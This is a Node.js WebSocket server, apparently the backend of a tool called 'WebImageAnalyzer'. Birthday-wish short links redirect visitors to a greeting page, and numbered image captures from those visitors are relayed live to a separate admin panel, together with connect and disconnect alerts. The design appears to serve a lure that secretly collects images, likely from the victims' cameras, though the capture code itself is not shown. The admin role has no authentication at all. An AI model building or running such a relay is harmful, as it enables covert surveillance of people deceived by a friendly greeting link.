const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const path = require('path');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

// serve static files from project folder
app.use(express.static(path.join(__dirname)));

// Handle short birthday links
app.get('/wish/:sessionId', (req, res) => {
  const sessionId = req.params.sessionId;
  
  // Check if session exists
  const sessionData = sessions.get(sessionId);
  const sessionName = sessionData ? sessionData.sessionName : 'Birthday Celebration';
  
  // Redirect to birthday page with session parameters
  const redirectUrl = `/birthday.html?session=${sessionId}&name=${encodeURIComponent(sessionName)}`;
  res.redirect(redirectUrl);
});

// Session and client management
const adminClients = new Set();
const userClients = new Map(); // sessionId -> Set of user WebSockets
const sessions = new Map(); // sessionId -> session metadata
let totalImages = 0;

function broadcastToAdmins(message) {
  const messageStr = JSON.stringify(message);
  for (let admin of adminClients) {
    if (admin.readyState === WebSocket.OPEN) {
      admin.send(messageStr);
    }
  }
}

function updateAdminStats() {
  const stats = {
    type: 'stats',
    totalImages: totalImages,
    activeSessions: Array.from(sessions.keys()),
    connectedUsers: Array.from(userClients.values()).reduce((sum, set) => sum + set.size, 0)
  };
  broadcastToAdmins(stats);
}

wss.on('connection', (ws, req) => {
  ws.on('message', (msg) => {
    let data = null;
    
    try {
      data = JSON.parse(msg.toString());
    } catch (e) {
      console.warn('Invalid JSON message:', e);
      return;
    }
    
    if (data.type === 'register') {
      if (data.role === 'admin') {
        ws.isAdmin = true;
        adminClients.add(ws);
        console.log('Admin connected');
        
        // Send current stats to new admin
        updateAdminStats();
        
      } else if (data.role === 'user' && data.sessionId) {
        ws.isUser = true;
        ws.sessionId = data.sessionId;
        
        // Add to user clients for this session
        if (!userClients.has(data.sessionId)) {
          userClients.set(data.sessionId, new Set());
        }
        userClients.get(data.sessionId).add(ws);
        
        console.log(`User connected to session: ${data.sessionId}`);
        
        // Notify admins
        broadcastToAdmins({ type: 'user_connected', sessionId: data.sessionId });
        updateAdminStats();
      }
      
    } else if (data.type === 'create_session') {
      // Admin is creating a new session
      sessions.set(data.sessionId, {
        id: data.sessionId,
        name: data.sessionName,
        created: Date.now(),
        imageCount: 0
      });
      console.log(`Session created: ${data.sessionId} (${data.sessionName})`);
      updateAdminStats();
      
    } else if (data.type === 'image' && data.sessionId) {
      // User is sending an image
      totalImages++;
      
      // Update session image count
      if (sessions.has(data.sessionId)) {
        sessions.get(data.sessionId).imageCount++;
      }
      
      // Forward to all admins
      broadcastToAdmins({
        type: 'image',
        sessionId: data.sessionId,
        time: data.time,
        payload: data.payload,
        captureNumber: data.captureNumber
      });
      
      updateAdminStats();
      
    } else if (data.type === 'session_ended' && data.sessionId) {
      // User ended their session
      console.log(`Session ended: ${data.sessionId}`);
      broadcastToAdmins({ type: 'session_ended', sessionId: data.sessionId });
    }
  });

  ws.on('close', () => {
    if (ws.isAdmin) {
      adminClients.delete(ws);
      console.log('Admin disconnected');
    } else if (ws.isUser && ws.sessionId) {
      const sessionUsers = userClients.get(ws.sessionId);
      if (sessionUsers) {
        sessionUsers.delete(ws);
        if (sessionUsers.size === 0) {
          userClients.delete(ws.sessionId);
        }
      }
      
      // Notify admins
      broadcastToAdmins({ type: 'user_disconnected', sessionId: ws.sessionId });
      updateAdminStats();
      
      console.log(`User disconnected from session: ${ws.sessionId}`);
    }
  });
});

const PORT = process.env.PORT || 8000;
server.listen(PORT, () => {
  console.log(`WebImageAnalyzer server listening on port ${PORT}`);
  console.log(`Admin panel: http://localhost:${PORT}/admin.html`);
});

// Export for Vercel serverless deployment
module.exports = app;
